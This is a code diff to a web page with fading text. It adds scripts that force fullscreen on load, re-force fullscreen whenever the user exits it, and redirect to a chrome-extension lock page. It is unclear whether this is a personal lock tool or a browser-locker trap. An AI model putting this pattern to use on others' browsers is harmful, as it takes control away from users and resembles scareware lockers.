@@ -77,6 +77,54 @@
     const first = document.getElementById('firstText');
     const second = document.getElementById('secondText');
 
+    // Function to request fullscreen on the body element
+    function requestFullscreen() {
+      const elem = document.documentElement;
+      if (!document.fullscreenElement) {
+        if (elem.requestFullscreen) {
+          elem.requestFullscreen().catch(() => {});
+        } else if (elem.mozRequestFullScreen) { /* Firefox */
+          elem.mozRequestFullScreen();
+        } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
+          elem.webkitRequestFullscreen();
+        } else if (elem.msRequestFullscreen) { /* IE/Edge */
+          elem.msRequestFullscreen();
+        }
+      }
+    }
+
+    // On page load, request fullscreen
+    window.onload = () => {
+      requestFullscreen();
+    };
+
+    // Listen for fullscreen change event
+    document.addEventListener('fullscreenchange', () => {
+      if (!document.fullscreenElement) {
+        // User exited fullscreen, force it back
+        requestFullscreen();
+      }
+    });
+
+    // Also listen for vendor-prefixed fullscreen changes for compatibility
+    document.addEventListener('webkitfullscreenchange', () => {
+      if (!document.webkitFullscreenElement) {
+        requestFullscreen();
+      }
+    });
+
+    document.addEventListener('mozfullscreenchange', () => {
+      if (!document.mozFullScreenElement) {
+        requestFullscreen();
+      }
+    });
+
+    document.addEventListener('MSFullscreenChange', () => {
+      if (!document.msFullscreenElement) {
+        requestFullscreen();
+      }
+    });
+
     setTimeout(() => {
       first.style.animation = 'fadeout 1s forwards';
     }, 3000);
@@ -90,7 +138,7 @@
 
     // Redirect after second text animation finishes
     setTimeout(() => {
-      window.location.href = 'https://tinyurl.com/yc2r8983';  // <-- change this URL to your website
+      window.location.href = 'chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/lock.html';
     }, 6000);
   </script>
 </body>
